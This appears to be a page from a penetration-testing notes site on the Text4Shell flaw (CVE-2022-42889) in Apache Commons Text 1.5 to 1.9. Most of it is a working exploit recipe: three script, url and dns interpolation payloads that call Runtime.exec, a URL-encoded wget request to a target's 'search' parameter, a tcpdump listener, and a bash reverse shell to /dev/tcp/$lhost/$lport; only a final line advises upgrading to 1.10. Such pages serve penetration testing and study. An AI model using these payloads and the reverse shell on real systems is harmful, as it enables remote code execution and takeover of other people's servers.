---
layout: default
title: Text4Shell [CVE-2022-42889]
parent: Web Applications
nav_order: 5
permalink: /webapps/text4shell/
---

# Text4Shell [CVE-2022-42889]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.

## Prerequisites

* Web application must run Apache Commons Text from version 1.5 to 1.9.

## Exploit

Interpolator objects that are affected by Text4Shell are `script`, `dns` and `url`. Therefore, to leverage this vulnerability, you first must identify the vulnerable parameter using one of the following payloads:
* `${script:javascript:java.lang.Runtime.getRuntime().exec('$command')}`
* `${url:UTF-8:java.lang.Runtime.getRuntime().exec('$command')}`
* `${dns:address:java.lang.Runtime.getRuntime().exec('$command')}`

As a `$command`, you can use a simple ping on your host to check if you can reach it. For this example, let's assume `search` is the vulnerable parameter.

```bash
# Don't forget to URL encode the payload first!
wget https://$target/whatever/?search=%27%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27ping%20-c%205%20$lhost%27%29%7D%27


# On your host, listen for ICMP requests.
sudo tcpdump -i $interface icmp -v
```

If you receive ping requests, you can leverage this vulnerability to perform remote code execution, for example by using a [reverse shell](https://www.revshells.com/).

```bash
sh -i >& /dev/tcp/$lhost/$lport 0>&1
```

## Useful links

* [Kljunowsky](https://github.com/kljunowsky/CVE-2022-42889-text4shell)'s GitHub repository.

## Recommendations

- [ ] Update Apache Commons Text to version 1.10 in which Text4Shell has been patched.